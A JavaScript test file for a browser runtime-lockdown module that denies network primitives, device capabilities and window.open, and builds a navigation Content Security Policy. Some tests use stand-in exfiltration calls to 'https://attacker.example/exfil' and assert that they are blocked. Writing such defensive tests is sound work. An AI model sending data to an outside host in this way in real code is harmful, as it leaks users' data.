import test from 'node:test';
import assert from 'node:assert/strict';
import {
  applyNetworkDenyByDefault,
  applyDeviceCapabilityDefaultDeny,
  applyNavigationLockdown,
  applyClosedRuntimeLockdown,
  buildNavigationContentSecurityPolicy,
} from '../../src/container/internal/safety/runtime-lockdown.mjs';

function fakeBrowserGlobal() {
  return {
    fetch: () => 'real-fetch-result',
    XMLHttpRequest: class {},
    WebSocket: class {},
    EventSource: class {},
    open: () => 'real-open-result',
    navigator: {
      mediaDevices: { getUserMedia: async () => 'stream' },
      userAgent: 'Test/1.0',
      geolocation: { getCurrentPosition: () => {} },
      bluetooth: { requestDevice: () => {} },
      usb: { requestDevice: () => {} },
      clipboard: { readText: async () => 'clipboard-secret' },
      sendBeacon: () => true,
    },
  };
}

test('CC-003/SP-003-P0 applyNetworkDenyByDefault replaces fetch/XHR/WebSocket/EventSource/sendBeacon with denying primitives', () => {
  const target = fakeBrowserGlobal();
  const result = applyNetworkDenyByDefault(target);
  assert.deepEqual([...result.denied].sort(), ['EventSource', 'WebSocket', 'XMLHttpRequest', 'fetch', 'navigator.sendBeacon'].sort());

  assert.throws(() => target.fetch());
  assert.throws(() => new target.XMLHttpRequest()); // constructor itself replaced with a throwing function
  assert.throws(() => new target.WebSocket());
  assert.throws(() => new target.EventSource());
  assert.throws(() => target.navigator.sendBeacon());
});

test('CC-003/SP-003-P0 an aliased/wrapped reference to a denied primitive is equally denied, since the underlying primitive itself is replaced', () => {
  const target = fakeBrowserGlobal();
  applyNetworkDenyByDefault(target);
  // "App code" captures its own alias/wrapper AFTER lockdown, exactly as it would after
  // importing following bootstrap's lockdown call.
  const myFetch = target.fetch;
  const wrapped = (...args) => myFetch(...args);
  assert.throws(() => wrapped('https://attacker.example/exfil'));
});

test('SP-001-P0 applyDeviceCapabilityDefaultDeny denies every non-approved navigator capability, including ones not individually enumerated', () => {
  const target = fakeBrowserGlobal();
  const result = applyDeviceCapabilityDefaultDeny(target);
  assert.equal(result.applied, true);

  assert.equal(target.navigator.geolocation, undefined);
  assert.equal(target.navigator.bluetooth, undefined);
  assert.equal(target.navigator.usb, undefined);
  assert.equal(target.navigator.clipboard, undefined);
  assert.equal('geolocation' in target.navigator, false);

  // A capability the registry has never even heard of (simulating a brand new browser API)
  // is denied by construction, not because a regex happens to name it.
  target.navigator.someFutureCapabilityApiNoOneHasWrittenARuleFor = { doSomething: () => {} };
  assert.equal(target.navigator.someFutureCapabilityApiNoOneHasWrittenARuleFor, undefined);

  // The one approved surface remains usable.
  assert.equal(typeof target.navigator.mediaDevices.getUserMedia, 'function');
});

test('SP-001-P0 applyNavigationLockdown denies window.open to app code while returning the original for the container\'s own approved path', () => {
  const target = fakeBrowserGlobal();
  const result = applyNavigationLockdown(target);
  assert.equal(result.applied, true);
  assert.equal(typeof result.originalOpen, 'function');
  assert.equal(result.originalOpen(), 'real-open-result');
  assert.throws(() => target.open('https://attacker.example'));
});

test('SP-001-P0/CC-003/SP-003-P0 applyClosedRuntimeLockdown applies every guard together', () => {
  const target = fakeBrowserGlobal();
  const result = applyClosedRuntimeLockdown(target);
  assert.ok(result.network.denied.length > 0);
  assert.equal(result.devices.applied, true);
  assert.equal(result.navigation.applied, true);
  assert.throws(() => target.fetch());
  assert.throws(() => target.open());
  assert.equal(target.navigator.geolocation, undefined);
});

test('SP-001-P0 buildNavigationContentSecurityPolicy produces a CSP restricting form-action/frame-src to approved destinations for the vectors JS cannot intercept', () => {
  const csp = buildNavigationContentSecurityPolicy(['https://help.babysteps.com']);
  assert.match(csp, /form-action https:\/\/help\.babysteps\.com/);
  assert.match(csp, /frame-src https:\/\/help\.babysteps\.com/);
  assert.match(buildNavigationContentSecurityPolicy([]), /'none'/);
});
